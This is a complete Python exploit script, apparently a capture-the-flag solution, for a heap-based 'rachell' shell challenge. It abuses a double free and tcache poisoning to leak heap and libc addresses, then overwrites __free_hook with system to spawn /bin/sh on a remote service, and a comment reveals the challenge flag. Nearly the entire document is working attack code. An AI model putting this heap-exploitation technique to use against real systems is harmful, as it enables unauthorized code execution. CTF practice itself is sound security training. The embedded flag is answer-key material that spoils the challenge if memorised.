#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './rachell'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.200.117.74', 'port':25252})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    ra = Rachell(conn)

    ra.mkdir('dir1')
    ra.cd('dir1')
    ra.touch('file1-a')
    ra.echo('a'*0x18, 'file1-a')
    ra.mkdir('dir1-1')
    ra.touch('file1-b')
    ra.echo('b'*0x88, 'file1-b')

    ra.cd('dir1-1')
    for _ in range(2):
        ra.rm('../file1-a')
    ra.echo('\xd0', '../file1-a')

    ra.touch('file1-1-a')
    ra.echo('a'*0x18, 'file1-1-a')
    ra.touch('file1-1-b')
    ra.echo('\xd0', 'file1-1-b')

    addr_heap_base = u(ra.pwd()[6:]) - 0x56d0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(2):
        ra.rm('../file1-a')
    for _ in range(8):
        ra.rm('../file1-b')
    ra.echo('\xd0', '../file1-a')

    ra.touch('file1-1-c')
    ra.echo('c'*0x18, 'file1-1-c')
    ra.touch('file1-1-d')
    ra.echo(p64(addr_heap_base+0x5860), 'file1-1-d')

    addr_libc_mainarena = u(ra.pwd()[6:]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    for _ in range(2):
        ra.rm('../file1-a')
    ra.echo(p64(addr_libc_free_hook), '../file1-a')

    ra.touch('file1-1-e')
    ra.echo('/bin/sh', 'file1-1-e')
    ra.touch('file1-1-f')
    ra.echo(p64(addr_libc_system), 'file1-1-f')

    ra.rm('file1-1-e')

class Rachell:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def ls(self, path):
        self.sendlineafter('command> ', 'ls')
        self.sendlineafter('path> ', path)

    def mkdir(self, name):
        self.sendlineafter('command> ', 'mkdir')
        self.sendlineafter('name> ', name)

    def cd(self, path):
        self.sendlineafter('command> ', 'cd')
        self.sendlineafter('path> ', path)

    def pwd(self):
        self.sendlineafter('command> ', 'pwd')
        return self.recvuntil('\n', drop=True)

    def touch(self, name):
        self.sendlineafter('command> ', 'touch')
        self.sendlineafter('filename> ', name)

    def echo(self, arg, path=None):
        self.sendlineafter('command> ', 'echo')
        self.sendlineafter('arg> ', arg)
        self.sendlineafter('redirect?> ', 'y' if path is not None else 'n')
        if path is not None:
            self.sendlineafter('path> ', path)

    def rm(self, path):
        self.sendlineafter('command> ', 'rm')
        self.sendlineafter('filename> ', path)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # TSGCTF{beer_is_delicious_if_you_dont_taste_it_6592867821310}

if __name__=='__main__':
    main()

#==========
